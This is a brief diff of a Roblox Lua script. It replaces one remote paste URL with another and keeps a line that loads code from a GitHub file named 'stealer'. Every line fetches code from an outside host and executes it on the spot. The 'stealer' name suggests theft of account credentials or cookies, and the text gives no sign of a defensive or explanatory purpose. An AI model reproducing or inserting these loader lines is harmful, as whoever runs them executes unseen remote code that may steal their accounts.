@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PZkWll1LOS/0", true))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/bGZ5EbIECX8wVKRx/raw", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/swiftasfboi/august/refs/heads/main/stealer"))()
